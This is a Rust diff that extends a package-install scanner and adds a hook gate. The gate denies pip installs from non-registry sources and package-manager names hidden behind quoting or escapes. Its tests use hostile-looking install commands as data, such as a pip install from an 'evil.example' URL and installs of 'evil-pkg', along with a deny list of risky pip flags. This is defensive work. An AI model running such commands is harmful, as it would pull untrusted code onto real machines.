@@ -81,6 +81,7 @@ pub enum RefOrigin {
     NpmLifecycle { script: String },
     Pkgbuild { function: String },
     WheelDataScript { path: String },
+    CommandLine,
 }
 
 /// One machine-resolved install reference. `pinned` means the spec carries
@@ -329,6 +330,9 @@ fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
         let verb = toks.get(i + 1);
         let starts_command = match (manager, verb.map(|t| t.lower.as_str())) {
             (RefManager::Npx, _) | (RefManager::Bunx, _) => Some(i + 1),
+            // `npm exec <pkg>` / `npm x <pkg>` / `bun x <pkg>` run a package
+            // exactly like npx does.
+            (RefManager::Npm, Some("exec" | "x")) | (RefManager::Bun, Some("x")) => Some(i + 2),
             (RefManager::Pip, Some("install" | "i")) => Some(i + 2),
             (RefManager::Pnpm, Some("dlx")) | (RefManager::Yarn, Some("dlx")) => Some(i + 2),
             (RefManager::Cargo, Some("install")) => Some(i + 2),
@@ -366,6 +370,9 @@ fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
 /// empty-string marker, a plausible package spec is captured, and
 /// flag-value noise that is neither dynamic nor a plausible spec is
 /// dropped.
+/// npx/npm-exec style flags that NAME the package to run.
+const PACKAGE_NAMING_FLAGS: [&str; 2] = ["--package", "-p"];
+
 fn positionals(toks: &[Tok], manager: RefManager, take_all: bool) -> Vec<String> {
     let mut specs = Vec::new();
     let mut skip_value = false;
@@ -381,6 +388,23 @@ fn positionals(toks: &[Tok], manager: RefManager, take_all: bool) -> Vec<String>
             continue;
         }
         if t.lower.starts_with('-') {
+            if manager == RefManager::Npx || manager == RefManager::Bunx {
+                let lower = t.lower.as_str();
+                if let Some(value) = PACKAGE_NAMING_FLAGS
+                    .iter()
+                    .find_map(|f| lower.strip_prefix(&format!("{f}=")))
+                {
+                    specs.push(value.to_string());
+                    if !take_all {
+                        break;
+                    }
+                    continue;
+                }
+                if PACKAGE_NAMING_FLAGS.contains(&lower) {
+                    skip_value = true;
+                    continue;
+                }
+            }
             if CONSUME_VALUE_FLAGS.contains(&t.lower.as_str()) {
                 skip_value = true;
             }
@@ -490,6 +514,67 @@ fn scan_text_line(line: &str, origin: &RefOrigin) -> Vec<InstallRef> {
         .into_iter()
         .map(|(manager, spec)| raw_ref(origin.clone(), manager, &spec))
         .collect()
+}
+
+/// Shapes the token scanner cannot safely resolve, surfaced for the hook
+/// gate to deny: pip flags that name or redirect non-registry sources, and
+/// manager tokens hidden inside quotes or shell escapes. Best-effort
+/// obfuscation (obase64'd scripts, indirect exec) is NOT caught here — the
+/// gate's doc says so.
+pub fn gate_hard_denies(line: &str) -> Vec<String> {
+    let mut denies = Vec::new();
+    if let Some(detail) = pip_non_registry_shape(line) {
+        denies.push(detail);
+    }
+    let lower_words: Vec<String> = line
+        .to_lowercase()
+        .split_whitespace()
+        .map(|w| w.to_string())
+        .collect();
+    const MANAGERS: [&str; 7] = ["npm", "npx", "pnpm", "yarn", "bun", "pip", "pip3"];
+    for word in &lower_words {
+        let bare = word
+            .trim_start_matches(['\\', '"', '\''])
+            .trim_end_matches(['"', '\'']);
+        if bare != word && MANAGERS.contains(&bare) {
+            denies.push(format!(
+                "package manager token hidden behind quoting or an escape: `{word}`"
+            ));
+        }
+    }
+    denies
+}
+
+fn pip_non_registry_shape(line: &str) -> Option<String> {
+    const DANGEROUS: [&str; 8] = [
+        "-r",
+        "--requirement",
+        "-e",
+        "--editable",
+        "-c",
+        "--constraint",
+        "--index-url",
+        "--extra-index-url",
+    ];
+    let lower = line.to_lowercase();
+    let words: Vec<&str> = lower.split_whitespace().collect();
+    for i in 0..words.len() {
+        if words[i] != "pip" && words[i] != "pip3" {
+            continue;
+        }
+        for window in words[i + 1..].windows(2) {
+            if window[0] == "install" || window[0] == "i" {
+                if DANGEROUS.contains(&window[1]) {
+                    return Some(format!(
+                        "pip {flag} names or redirects non-registry sources",
+                        flag = window[1]
+                    ));
+                }
+                break;
+            }
+        }
+    }
+    None
 }
 
 #[cfg(test)]
@@ -791,6 +876,43 @@ mod tests {
         assert_eq!(r.registry_spec(), Some(("requests", Some("2.31.0"))));
         r.spec = "my_pkg".into();
         assert_eq!(r.registry_spec(), Some(("my_pkg", None)));
+    }
+
+    #[test]
+    fn gate_hard_denies_pip_non_registry_shapes() {
+        let denies = gate_hard_denies("pip install -r https://evil.example/x.txt");
+        assert_eq!(denies.len(), 1, "{denies:?}");
+        assert!(denies[0].contains("-r"));
+        assert!(gate_hard_denies("pip3 install -e git+https://x").len() == 1);
+        assert!(gate_hard_denies("pip install requests==2.31.0").is_empty());
+        assert!(gate_hard_denies("pip install -q requests").is_empty());
+    }
+
+    #[test]
+    fn gate_hard_denies_quoted_and_escaped_managers() {
+        for line in [
+            "\"npm\" install evil-pkg",
+            "'npm' install evil-pkg",
+            "\\npm install evil-pkg",
+        ] {
+            let denies = gate_hard_denies(line);
+            assert_eq!(denies.len(), 1, "{line}: {denies:?}");
+        }
+        assert!(gate_hard_denies("npm install evil-pkg").is_empty());
+        assert!(gate_hard_denies("echo $(date) && npm install ok-pkg").is_empty());
+    }
+
+    #[test]
+    fn scanner_captures_npx_package_flag_and_exec_verbs() {
+        let refs = scan_line("npx --package=evil-pkg serve");
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].1, "evil-pkg");
+        let refs = scan_line("npm exec evil-pkg -- --flag");
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].1, "evil-pkg");
+        let refs = scan_line("bun x malcontent");
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].1, "malcontent");
     }
 
     #[test]
